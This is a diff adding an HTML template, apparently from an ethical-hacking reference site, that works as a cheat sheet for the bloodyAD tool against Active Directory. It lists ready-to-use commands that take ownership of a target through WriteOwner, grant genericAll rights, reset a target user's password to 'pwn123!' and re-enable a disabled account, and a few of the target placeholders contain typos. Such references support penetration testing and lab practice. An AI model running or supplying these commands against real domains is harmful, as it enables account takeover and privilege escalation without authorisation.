@@ -1,0 +1,27 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>What is <code>BloodyAD</code>?</h1>
+    <p class="common">bloodyAD can perform specific LDAP calls to a domain controller in order to perform AD privesc. It supports authentication using cleartext passwords.</p>
+
+    <h1>Usage</h1>
+    <h2 class="blue">Gain Ownership of target OU using WriteOwner privilege</h2>
+    <div class="code-box"><pre><code>bloodyAD -d $DOMAIN --host $IP -u USER -p PASSWORD set owner TARGET_USER USER
+bloodyAD -d $DOMAIN --host $IP -u USER -p PASSWORD add genericAll TARGET_USDR USER</code></pre></div>
+
+<h2 class="blue">change password</h2>
+<div class="code-box"><pre><code>bloodyAD --host $IP -d DOMAIN -u USER -p 'PASSWD' set password 'TARGET' 'pwn123!'</code></pre></div>
+
+<h2 class="blue">Remove <code>ACCOUNTDISABLE</code> flag</h2>
+<div class="code-box"><pre><code>bloodyAD --host $IP -d DOMAIN -u USER -p 'PASSWD' remove uac 'TAEGET_USR' -f ACCOUNTDISABLE</code></pre></div>
+
+
+</body>
+</html>
